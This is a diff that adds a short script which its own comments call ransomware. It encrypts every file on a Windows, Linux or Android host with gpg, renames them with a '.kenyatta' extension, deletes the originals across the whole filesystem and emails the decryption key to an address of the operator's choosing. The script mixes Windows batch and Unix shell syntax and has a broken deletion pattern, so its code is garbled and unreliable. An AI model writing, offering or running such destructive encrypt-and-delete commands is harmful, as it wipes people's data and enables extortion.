@@ -1,0 +1,22 @@
+REM This script encrypts all files on a Windows, Linux, or Android system, appends ".kenyatta" to the encrypted files, and generates a random decryption key that is sent to an email address.
+
+REM Change the value of the "email_address" variable to your desired email address
+SET email_address "you@example.com"
+
+REM Generate a random passphrase
+gpg --gen-random -a 0 20 > passphrase.txt
+
+REM Read the passphrase from the file
+SET /p passphrase=<passphrase.txt
+
+REM Encrypt all files on the host
+find / -type f -exec gpg --symmetric --passphrase %passphrase% --output "{}.kenyatta" "{}" \;
+
+REM Delete the original unencrypted files
+find / -type f -name "*[!kenyatta]" -delete
+
+REM Send the passphrase to the specified email address
+echo "The decryption key for the encrypted files is: %passphrase%" | mail -s "Decryption Key" %email_address%
+
+REM Delete the passphrase file
+DEL /Q /F passphrase.txt
